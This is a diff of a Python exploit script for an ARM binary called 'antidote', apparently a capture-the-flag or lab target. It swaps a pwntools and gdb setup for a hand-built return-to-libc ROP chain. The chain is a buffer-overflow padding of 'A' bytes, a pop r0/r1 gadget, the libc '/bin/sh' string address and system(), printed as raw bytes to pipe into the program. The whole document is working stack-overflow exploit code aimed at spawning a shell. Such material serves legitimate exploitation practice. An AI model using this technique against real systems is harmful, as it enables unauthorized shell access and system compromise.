@@ -1,33 +1,23 @@
-from pwn import *
-import time
-# Load Environment
-context.terminal = ['tmux','splitw' ,'-h']
-context.arch = 'arm'
+import sys
 
-# python2 -c 'print "A" * 220 + "\xcc\x34\xf0\xb6" + "B" * 4 + "\x2c\xbf\xfa\xb6"' | gdbserver --wrapper env 'LD_PRELOAD=./libc.so.6' -- :2000 ./antidote
 
-#p = remote('192.168.0.19', 2000)
-p = process('./antidote')
-gdb.attach(p, '''
-target remote 192.168.0.19:2000
-break *main
-break *main+104
-''')
+libc_system = "\xcc\x34\xf0\xb6" # <__libc_system>
+libc_binsh = "\x2c\xbf\xfa\xb6"
+libc_execve = "\x9c\x84\xf4\xb6"
 
-libc_system = p32(0xb6f034cc)
-binsh = p32(0xb6fabf2c)
-pop_r3 = p32(0xbefd83cc)
-pop_r0_r1 = p32(0x0006b864)
-0x00008f2d
-0xb6f15f5b
+bx_lr = "\xac\x84\x00\x00"
+blx_r4 = "\x1d\xfb\xee\xb6"
+pop_r0_r1 = "\x65\x18\xf4\xb6"
+pop_r3 = 0x000083c
+pop_r0123457 = "\x6f\x0b\xf0\xb6"
+
 
 payload = ""
-payload += "A" * 220
+payload += "A" * 216
 payload += libc_system
-payload += "JUNK"
-payload += binsh
+payload += pop_r0_r1
+payload += libc_binsh   # r0
+payload += "\x00" * 4   # r1
+payload += libc_system
 
-
-p.recv()
-#p.sendline(payload)
-p.interactive()
+print payload
